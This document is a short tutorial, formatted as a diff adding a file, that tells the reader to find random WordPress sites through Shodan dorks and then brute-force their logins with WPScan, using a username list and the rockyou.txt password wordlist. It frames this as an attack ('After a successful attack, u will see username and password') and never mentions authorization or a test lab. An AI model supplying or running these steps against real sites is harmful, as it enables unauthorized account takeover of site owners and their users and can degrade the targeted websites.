@@ -1,0 +1,25 @@
+[1] For this tutorial we need to use "WPScan tool".
+
+Use this command to run in first time:
+                                        wpscan -h (may prompt you to make an wpscan db update, just write "y" and press enter).
+                                        
+
+[2] Find some WP site for brute force. One method for finding is via dorks and use Shodan.
+
+How to find via shodan.io?
+- use this dork "wordpress country:"NL" " (this country now it's just for example) 
+
+[3] Open terminal and write:
+wpscan --url http://WORDPRESS-SITE.com  -U users.txt -P /usr/share/wordlists/rockyou.txt
+
+–URL  is URL parameter, followed by URL of the wordpress website to be scanned
+
+-U will only bruteforce the supplied usernames, in our case it is users.txt
+
+-P will bruteforce the passwords from the provided list rockyou.txt
+
+The scan duration mainly depends on how large the password dictionary file is and as we are mapping a large number of users with even larger numbers of passwords it could also impact the performance of the website if left running for a long time.
+
+After a successful attack, u will see username and password.
+
+~ Enjoy The Movement!
